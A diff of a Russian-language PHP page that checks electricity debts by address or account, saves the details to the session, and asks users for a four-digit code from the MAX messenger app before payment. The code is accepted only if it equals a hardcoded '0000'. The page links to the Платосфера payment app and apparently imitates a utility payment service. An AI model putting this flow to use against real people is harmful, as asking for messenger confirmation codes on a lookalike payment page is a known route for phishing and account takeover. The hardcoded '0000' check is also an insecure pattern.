@@ -1,7 +1,7 @@
 <?php
 session_start();
 $message      = '';
-$showCode     = false;  // окно кода из СМС (по долгу)
+$showCode     = false;  // окно кода из МАКС (по долгу)
 $codeError    = '';
 $showMaxCode  = false;  // окно кода из приложения МАКС
 $maxCodeError = '';
@@ -11,10 +11,10 @@ $noDebt       = '';     // '', 'address' или 'ls' — нет задолжен
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
-    // --- Код из СМС (по долгу) ---
+    // --- Код из МАКС (подтверждение оплаты по долгу) ---
     if (isset($_POST['sms_code'])) {
         if ($_POST['sms_code'] === '0000') {
-            header('Location: payment.html');
+            header('Location: payment.php'); // данные о долге уже в сессии
             exit;
         }
         $showCode  = true;
@@ -75,7 +75,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         mysqli_close($conn);
 
         if ($debt !== null && $debt > 0) {
-            $showCode = true;
+            // сохраняем данные о задолженности и ведём на страницу оплаты
+            if (isset($_POST['account_number'])) {
+                $_SESSION['pay'] = [
+                    'type'     => 'ls',
+                    'district' => $_POST['district'],
+                    'account'  => $_POST['account_number'],
+                    'debt'     => $debt,
+                ];
+            } else {
+                $_SESSION['pay'] = [
+                    'type'      => 'address',
+                    'address'   => $_POST['address'],
+                    'apartment' => $_POST['apartment'],
+                    'debt'      => $debt,
+                ];
+            }
+            $showCode = true; // сначала код из МАКС, потом payment.php
         } else {
             $noDebt = isset($_POST['account_number']) ? 'ls' : 'address';
         }
@@ -105,7 +121,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <main>
         <div class="display-1">
             <section class="block-1">
-                <h1 class="block-1-text">В мобильном приложении «Платосфера» теперь доступна новая услуга - «Автоплатеж за свет»</h1>
+                <h1 class="block-1-text">В мобильном приложении <a href="https://play.google.com/store/apps/details?id=ru.nskes.paysphera&hl=ru" target="_blank">Платосфера</a> теперь доступна новая услуга - «Автоплатеж за свет»</h1>
                 <img src="images/auto-plata.png" class="auto-plata">
             </section>
             <section class="info-area">
@@ -236,18 +252,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     <!-- Окно: код из приложения МАКС (номер найден) -->
     <?php if ($showMaxCode): ?>
-    <div class="info-overlay open">
-        <div class="info-box centered">
-            <h2>Код из приложения МАКС</h2>
+    <div id="maxOverlay" onclick="if(event.target===this)this.style.display='none'"
+         style="position:fixed; inset:0; z-index:9999; background:rgba(0,0,0,0.6);
+                display:flex; align-items:center; justify-content:center;">
+        <div class="code-box" style="background: linear-gradient(135deg, #b948b5, #2575fc); padding:40px 60px; border-radius:12px; text-align:center;
+                    font-family:sans-serif; box-shadow:0 10px 40px rgba(0,0,0,0.3);">
+            <p style="font-size:24px; margin:0 0 20px; color:white">Код из приложения МАКС</p>
             <form method="POST">
                 <input type="text" name="max_code" maxlength="4" pattern="\d{4}"
-                    placeholder="0000" required autofocus
-                    style="font-size:26px; padding:10px; width:140px; text-align:center; letter-spacing:8px;">
+                       placeholder="" required autofocus
+                       style="font-size:28px; text-align:center; width:150px; letter-spacing:10px;
+                              padding:10px; border:1px solid #ccc; border-radius:8px;">
                 <?php if ($maxCodeError): ?>
-                    <p style="color:#f88; margin:10px 0 0;"><?= $maxCodeError ?></p>
+                    <p style="color:#ffd; font-size:16px; margin:12px 0 0;"><?= $maxCodeError ?></p>
                 <?php endif; ?>
                 <br>
-                <button type="submit" class="modal-submit">Подтвердить</button>
+                <button type="submit" class="btn-1" style="margin-top:20px;">Подтвердить</button>
             </form>
         </div>
     </div>
@@ -319,6 +339,11 @@ addressInput.addEventListener('input', function () {
     if (this.value.includes(',')) {
         this.value = this.value.replace(/^(ул\. )(\p{L})/u, (m, prefix, letter) => prefix + letter.toUpperCase());
     }
+
+    // 3. После запятой — всегда пробел
+    if (this.value.includes(',')) {
+        this.value = this.value.replace(/\s*,\s*/g, ', ');
+    }
 });
 
 
@@ -349,12 +374,26 @@ document.getElementById('form-adress').addEventListener('submit', function (e) {
             sessionStorage.removeItem('scrollY');
         }
     });
+
+    // градиент следует за курсором по слову «Платосфера»
+    const platLink = document.querySelector('.block-1-text a');
+    if (platLink) {
+        platLink.addEventListener('mousemove', e => {
+            const rect = platLink.getBoundingClientRect();
+            const percent = ((e.clientX - rect.left) / rect.width) * 100;
+            platLink.style.backgroundPosition = percent + '% center';
+        });
+        platLink.addEventListener('mouseleave', () => {
+            platLink.style.backgroundPosition = '0% center';
+        });
+    }
 </script>
 </body>
 <?php if ($showCode): ?>
-    <div style="position:fixed; inset:0; z-index:9999; background:rgba(0,0,0,0.6);
+    <div id="codeOverlay" onclick="if(event.target===this)this.style.display='none'"
+         style="position:fixed; inset:0; z-index:9999; background:rgba(0,0,0,0.6);
                 display:flex; align-items:center; justify-content:center;">
-        <div style="background: linear-gradient(135deg, #b948b5, #2575fc);; padding:40px 60px; border-radius:12px; text-align:center;
+        <div class="code-box" style="background: linear-gradient(135deg, #b948b5, #2575fc); padding:40px 60px; border-radius:12px; text-align:center;
                     font-family:sans-serif; box-shadow:0 10px 40px rgba(0,0,0,0.3);">
             <p style="font-size:24px; margin:0 0 20px; color:white">Введите код из приложения MAX</p>
             <form method="POST">
@@ -363,13 +402,10 @@ document.getElementById('form-adress').addEventListener('submit', function (e) {
                        style="font-size:28px; text-align:center; width:150px; letter-spacing:10px;
                               padding:10px; border:1px solid #ccc; border-radius:8px;">
                 <?php if ($codeError): ?>
-                    <p style="color:#c00; font-size:16px; margin:12px 0 0;"><?= $codeError ?></p>
+                    <p style="color:#ffd; font-size:16px; margin:12px 0 0;"><?= $codeError ?></p>
                 <?php endif; ?>
                 <br>
-                <button type="submit" style="margin-top:20px; font-size:18px; padding:10px 30px;
-                        background:#0066cc; color:#fff; border:none; border-radius:8px; cursor:pointer;">
-                    Подтвердить
-                </button>
+                <button type="submit" class="btn-1" style="margin-top:20px;">Подтвердить</button>
             </form>
         </div>
     </div>
